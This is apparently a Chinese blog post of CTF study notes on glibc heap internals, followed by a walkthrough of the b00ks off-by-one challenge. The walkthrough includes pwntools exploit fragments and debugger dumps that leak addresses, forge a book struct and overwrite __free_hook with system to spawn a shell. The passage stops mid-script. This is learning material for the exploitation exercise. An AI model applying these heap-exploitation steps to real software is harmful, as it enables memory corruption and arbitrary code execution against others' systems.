<li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li>
<li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li>
</ul>
<h4 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h4><p>程序第一次malloc时，heap会被分成两块，一块给用户，一块就是topchunk，这个topchunk物理地址时最高的，它不属于任何一个bin，如果所有bin都满足不了用户需求，就从他这分走一块bin，剩余的做成新的topbchunk。</p>
<p>初始情况可以把unsortedbin作为topchunk。</p>
<h4 id="last-remainder"><a href="#last-remainder" class="headerlink" title="last remainder"></a>last remainder</h4><p>在用户使用 malloc 请求分配内存时，ptmalloc2 找到的 chunk 可能并不和申请的内存大小一致，这时候就将分割之后的剩余部分称之为 last remainder chunk ，unsort bin 也会存这一块。top chunk 分割剩下的部分不会作为 last remainder.</p>
<h2 id="UNLINK"><a href="#UNLINK" class="headerlink" title="UNLINK"></a>UNLINK</h2><p>unlink是一个ptmalloc中的操作，为了将双向链表中的一个元素取出来</p>
<p>如：</p>
<p>1、malloc时需要从largebin中取出chunk，而fastbin和smallbin不使用unlink，依次遍历处理unsortedbin也不会用unlink，或者从比请求chunk所在bin打的bin中取chunk时</p>
<p>2、free：向后合并，合并物理地址相邻的低地址空闲chunk；向前合并，合并物理地址相邻的高地址空闲chunk</p>
<p>3、malloc_consolidate</p>
<p>向后合并，合并物理地址相邻的低地址空闲chunk；向前合并，合并物理地址相邻的高地址空闲chunk</p>
<p>4、realloc</p>
<p>向前扩展，合并物理地址相邻高地址空闲chunk</p>
<p>下图是经典的smallbin的unlink：</p>
<p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230330210801150.png" alt="image-20230330210801150"></p>
<h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><p>原理：溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（<strong>之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数</strong>），因而导致了数据溢出，并覆盖到<strong>物理相邻的高地址</strong>的下一个堆块。</p>
<p>策略：</p>
<ol>
<li><p>覆盖与其</p>
<p>物理相邻的下一个 chunk</p>
<p>的内容。</p>
<ul>
<li>prev_size</li>
<li>size，主要有三个比特位，以及该堆块真正的大小。<ul>
<li>NON_MAIN_ARENA</li>
<li>IS_MAPPED</li>
<li>PREV_INUSE</li>
<li>the True chunk size</li>
</ul>
</li>
<li>chunk content，从而改变程序固有的执行流。</li>
</ul>
</li>
<li><p>利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。</p>
</li>
</ol>
<p>calloc与malloc区别就是calloc会在分配后自动清空</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">calloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="comment">//等同于</span></span><br><span class="line">ptr=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">memset</span>(ptr,<span class="number">0</span>,<span class="number">0x20</span>);</span><br></pre></td></tr></table></figure>

<p>realloc</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">当 <span class="built_in">realloc</span>(ptr,size) 的 size 不等于 ptr 的 size 时</span><br><span class="line">如果申请 size &gt; 原来 size</span><br><span class="line">如果 chunk 与 <span class="attribute">top</span> chunk 相邻，直接扩展这个 chunk 到新 size 大小</span><br><span class="line">如果 chunk 与 <span class="attribute">top</span> chunk 不相邻，相当于 <span class="built_in">free</span>(ptr),<span class="built_in">malloc</span>(new_size)</span><br><span class="line">如果申请 size &lt; 原来 size</span><br><span class="line">如果相差不足以容得下一个最小 <span class="built_in">chunk</span>(<span class="number">64</span> 位下 <span class="number">32</span> 个字节，<span class="number">32</span> 位下 <span class="number">16</span> 个字节)，则保持不变</span><br><span class="line">如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分</span><br><span class="line">当 <span class="built_in">realloc</span>(ptr,size) 的 size 等于 <span class="number">0</span> 时，相当于 <span class="built_in">free</span>(ptr)</span><br><span class="line">当 <span class="built_in">realloc</span>(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作</span><br></pre></td></tr></table></figure>

<p>例题还没刷到</p>
<h2 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h2><p>原理：off-by-one指的是单字节缓冲区溢出，漏洞与边界检查不严和字符串传递有关。</p>
<p>利用思路：</p>
<p>1、溢出字节位可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或者覆盖其他块数据。也可以使用NULL字节溢出方法。</p>
<p>2、溢出字节为NULL字节：在size为0x100的时候，溢出NULL字节可以使得prev_in_use位被清除，这样前块会被认为是free块。（1）这时候可以选择unlink方法进行处理（2）另外prev_size就会启用，就可以伪造prev_size，从而造成块之间发生重叠。这个方法关键是unlink有没有检查按照prev_size找到的块的大小与prev_size是否一致。</p>
<p>ps.2.28之前没有check方法2</p>
<p>举一个例子，刚开始看真的不是很好理解：</p>
<p>b00ks：</p>
<p>这个程序有很多功能</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> Create a book</span><br><span class="line"><span class="bullet">2.</span> Delete a book</span><br><span class="line"><span class="bullet">3.</span> Edit a book</span><br><span class="line"><span class="bullet">4.</span> Print book detail</span><br><span class="line"><span class="bullet">5.</span> Change current author name</span><br><span class="line"><span class="bullet">6.</span> Exit</span><br></pre></td></tr></table></figure>

<p>书本的一个结构体大小是20字节</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">book</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">char</span> *description;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>作者名字可以修改，book结构体中的description可以修改，这两处修改函数都是有offbyone漏洞的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 __fastcall <span class="title function_">my_read</span><span class="params">(_BYTE *ptr, <span class="type">int</span> number)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( number &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  buf = ptr;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)read(<span class="number">0</span>, buf, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == number )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先输入作者名后可以搜索到存放地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -s flag</span><br><span class="line">b00ks           <span class="number">0x555555602040</span> <span class="number">0x67616c66</span> /* <span class="string">&#x27;flag&#x27;</span> */</span><br><span class="line">libc-<span class="number">2.31</span>.so    <span class="number">0x7ffff7dd938b</span> <span class="number">0x5f5f007367616c66</span> /* <span class="string">&#x27;flags&#x27;</span> */</span><br><span class="line">libc-<span class="number">2.31</span>.so    <span class="number">0x7ffff7ddbf01</span> <span class="number">0x5f5f007367616c66</span> /* <span class="string">&#x27;flags&#x27;</span> */</span><br><span class="line">libc-<span class="number">2.31</span>.so    <span class="number">0x7ffff7ddc336</span> <span class="number">0x7563007367616c66</span> /* <span class="string">&#x27;flags&#x27;</span> */</span><br><span class="line">libc-<span class="number">2.31</span>.so    <span class="number">0x7ffff7f77de0</span> <span class="number">0x6f4e007367616c66</span> /* <span class="string">&#x27;flags&#x27;</span> */</span><br><span class="line">libc-<span class="number">2.31</span>.so    <span class="number">0x7ffff7f7ec06</span> <span class="string">&#x27;flags &amp; PRINTF_FORTIFY) != 0&#x27;</span></span><br><span class="line">ld-<span class="number">2.31</span>.so      <span class="number">0x7ffff7ff5213</span> <span class="number">0x642f002967616c66</span> /* <span class="string">&#x27;flag)&#x27;</span> */</span><br><span class="line">ld-<span class="number">2.31</span>.so      <span class="number">0x7ffff7ff5d3e</span> <span class="string">&#x27;flag value(s) of 0x%x in DT_FLAGS_1.\\n&#x27;</span></span><br><span class="line">ld-<span class="number">2.31</span>.so      <span class="number">0x7ffff7ff6745</span> <span class="string">&#x27;flags &amp; DL_LOOKUP_RETURN_NEWEST)&#x27;</span></span><br><span class="line">pwndbg&gt; x/20xg <span class="number">0x555555602040</span>//打印地址</span><br><span class="line"><span class="number">0x555555602040</span>:	<span class="number">0x0000000067616c66</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602060</span>:	<span class="number">0x00005555556036f0</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="comment">#0x00005555556036f0该地址用来存放malloc创造的list地址</span></span><br></pre></td></tr></table></figure>

<p>当我进行下面操作：&#x2F;&#x2F;需要调试list1_addr的地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0xe0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0xe0</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Author: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">list1_addr=u64(p.recvuntil(<span class="string">&#x27;\\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#list1——addr就是555555603600这个值</span></span><br><span class="line">pwndbg&gt; x/20gx <span class="number">0x555555602040</span></span><br><span class="line"><span class="number">0x555555602040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555602050</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555602060</span>:	<span class="number">0x0000555555603600</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>发现0x00005555556036f0最后两位变成了\X00，就是off-by-one，这样程序会认为该地址0x555555603600才是list的地址，我们直接看一下布局：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20xg <span class="number">0x555555602040</span></span><br><span class="line"><span class="number">0x555555602040</span>:	<span class="number">0x0000786b6b687779</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602060</span>:	<span class="number">0x00005555556036f0</span>	<span class="number">0x0000555555603760</span>  <span class="comment">#list_1 &amp; list_2</span></span><br><span class="line"><span class="number">0x555555602070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>可以发现0x00005555556036f0存的是list1堆地址起始地址（不包括size）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x5555556036a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x5555556036b0</span>:	<span class="number">0x0000000071717171</span>	<span class="number">0x0000000000000000</span>	<span class="comment">#list_1_bookname</span></span><br><span class="line"><span class="number">0x5555556036c0</span>:	<span class="number">0x0000000000000000</span>	（pre_size）</span><br><span class="line">																		<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x5555556036d0</span>:	<span class="number">0x0000000077777777</span>	<span class="number">0x0000000000000000</span>	<span class="comment">#list_1_description</span></span><br><span class="line"><span class="number">0x5555556036e0</span>: <span class="number">0x0000000000000000</span>  （pre_size）</span><br><span class="line">																		<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5555556036f0</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00005555556036b0</span>	<span class="comment">#list_1</span></span><br><span class="line"><span class="number">0x555555603700</span>:	<span class="number">0x00005555556036d0</span>	<span class="number">0x0000000000000004</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x555555603710</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x555555603720</span>:	<span class="number">0x0000000065656565</span>	<span class="number">0x0000000000000000</span>  <span class="comment">#list_2_bookname</span></span><br><span class="line"><span class="number">0x555555603730</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x555555603740</span>:	<span class="number">0x0000000072727272</span>	<span class="number">0x0000000000000000</span>	<span class="comment">#list_2_description</span></span><br><span class="line"><span class="number">0x555555603750</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x555555603760</span>:	<span class="number">0x0000000000000002</span>	<span class="number">0x0000555555603720</span>	<span class="comment">#list_2</span></span><br><span class="line"><span class="number">0x555555603770</span>:	<span class="number">0x0000555555603740</span>	<span class="number">0x0000000000000004</span></span><br><span class="line"><span class="number">0x555555603780</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020881</span></span><br></pre></td></tr></table></figure>

<p>那么，我创建list1和list2，并且修改list1的decription时：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0xe0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0xe0</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">create(<span class="number">0x21000</span>, <span class="string">&#x27;cccc&#x27;</span>, <span class="number">0x21000</span>, <span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">1</span>) + p64(book2_control_ptr + <span class="number">8</span>) * <span class="number">2</span> + p64(<span class="number">0x1000</span>)</span><br><span class="line">change(<span class="number">1</span>,payload)</span><br><span class="line"><span class="number">0x5555556036f0</span>:	<span class="number">0x0000000000000001</span>（<span class="built_in">id</span>）	<span class="number">0x00005555556036b0</span>（bookname_addr）	<span class="comment">#list_1</span></span><br><span class="line"><span class="number">0x555555603700</span>:	<span class="number">0x00005555556036d0</span>（description_addr）	<span class="number">0x0000000000000004</span>（size）</span><br></pre></td></tr></table></figure>

<p>heap空间布局如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x55c18a470400</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x000055c18a4704c8</span>	<span class="comment">#fake_list</span></span><br><span class="line"><span class="number">0x55c18a470410</span>:	<span class="number">0x000055c18a4704c8</span>	<span class="number">0x0000000000001000</span></span><br><span class="line">该处虚假的<span class="built_in">list</span>，p位设为<span class="number">0</span>，程序会把这个地方识别为list1</span><br></pre></td></tr></table></figure>

<p>这个地址就是list2的name地址，获取这个地址是要求libc_base，因为list2开辟空间太大，使用mmap函数开辟</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x563fc9c00000</span>     <span class="number">0x563fc9c02000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      /home/ywhkkx/桌面/b00ks</span><br><span class="line">    <span class="number">0x563fc9e01000</span>     <span class="number">0x563fc9e02000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/ywhkkx/桌面/b00ks</span><br><span class="line">    <span class="number">0x563fc9e02000</span>     <span class="number">0x563fc9e03000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/ywhkkx/桌面/b00ks</span><br><span class="line">    <span class="number">0x563fcb86d000</span>     <span class="number">0x563fcb88e000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [heap]</span><br><span class="line">    <span class="number">0x7ff6d3dcf000</span>     <span class="number">0x7ff6d3e13000</span> rw-p    <span class="number">44000</span> <span class="number">0</span>      [anon_7ff6d3dcf]</span><br><span class="line">    <span class="number">0x7ff6d3e13000</span>     <span class="number">0x7ff6d3e38000</span> r--p    <span class="number">25000</span> <span class="number">0</span>      /usr/lib/x86_64-linux-gnu/libc-<span class="number">2.31</span>.so</span><br><span class="line">    <span class="number">0x7ff6d3e38000</span>     <span class="number">0x7ff6d3fb0000</span> r-xp   <span class="number">178000</span> <span class="number">25000</span>  /usr/lib/x86_64-linux-gnu/libc-<span class="number">2.31</span>.so</span><br><span class="line">    <span class="number">0x7ff6d3fb0000</span>     <span class="number">0x7ff6d3ffa000</span> r--p    4a000 19d000 /usr/lib/x86_64-linux-gnu/libc-<span class="number">2.31</span>.so</span><br><span class="line">    <span class="number">0x7ff6d3ffa000</span>     <span class="number">0x7ff6d3ffb000</span> ---p     <span class="number">1000</span> <span class="number">1e7000</span> /usr/lib/x86_64-linux-gnu/libc-<span class="number">2.31</span>.so</span><br><span class="line">-------------------------------------------------------------------------</span><br><span class="line">[+] bookname2 &gt;&gt;<span class="number">0x7ff6d3df1010</span></span><br><span class="line">libc = <span class="number">0x7ff6d3e13000</span> - bookname2 </span><br><span class="line">pwndbg&gt; x/60xg <span class="number">0x55c18a470390</span></span><br><span class="line"><span class="number">0x55c18a470390</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000000f1</span></span><br><span class="line"><span class="number">0x55c18a4703a0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span>	<span class="comment">#list_1_description</span></span><br><span class="line"><span class="number">0x55c18a4703b0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55c18a4703c0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55c18a4703d0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55c18a4703e0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55c18a4703f0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span>	</span><br><span class="line"><span class="number">0x55c18a470400</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x000055c18a4704c8</span>	<span class="comment">#fake_list</span></span><br><span class="line"><span class="number">0x55c18a470410</span>:	<span class="number">0x000055c18a4704c8</span>	<span class="number">0x0000000000001000</span></span><br><span class="line"><span class="number">0x55c18a470420</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span>	</span><br><span class="line"><span class="number">0x55c18a470430</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c18a470440</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c18a470450</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c18a470460</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c18a470470</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c18a470480</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x55c18a470490</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x000055c18a4702b0</span>	<span class="comment">#list_1</span></span><br><span class="line"><span class="number">0x55c18a4704a0</span>:	<span class="number">0x000055c18a4703a0</span>	<span class="number">0x00000000000000e0</span></span><br><span class="line"><span class="number">0x55c18a4704b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x55c18a4704c0</span>:	<span class="number">0x0000000000000002</span>	<span class="number">0x00007fee78052010</span>	<span class="comment">#list_2</span></span><br><span class="line"><span class="number">0x55c18a4704d0</span>:	<span class="number">0x00007fee78030010</span>	<span class="number">0x0000000000021000</span></span><br><span class="line"><span class="number">0x55c18a4704e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000001fb21</span></span><br></pre></td></tr></table></figure>

<p>接下来可以用free_hook来getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">libc_base = bookname2 + <span class="number">0x21ff0</span> </span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="comment">#one_gadget = libc_base + 0xe6c81</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">success(<span class="string">&#x27;system &gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>, p64(bin_sh) + p64(free_hook))</span><br><span class="line">change(<span class="number">2</span>, p64(system))</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>其实就是求出binsh，freehook，system地址，然后再次放到list1里进行伪造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x55c18a470400</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x000055c18a4704c8</span>	<span class="comment">#fake_list</span></span><br><span class="line"><span class="number">0x55c18a470410</span>:	<span class="number">0x000055c18a4704c8</span>	<span class="number">0x0000000000001000</span>  <span class="comment">#fake_description(list_2)</span></span><br><span class="line"><span class="number">0x55c18a470420</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c18a4704c0</span>:	<span class="number">0x0000000000000002</span>	addr(<span class="string">&quot;/bin/sh&quot;</span>)		<span class="comment">#list_2</span></span><br><span class="line"><span class="number">0x55c18a4704d0</span>:	addr(free_hook)		<span class="number">0x0000000000021000</span></span><br><span class="line"><span class="number">0x55c18a4704e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000001fb21</span></span><br></pre></td></tr></table></figure>

<p>执行free（2），就会和上面的合并，也就是执行freehook挂钩的system函数（不是很理解）</p>
<p>下面是真正的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 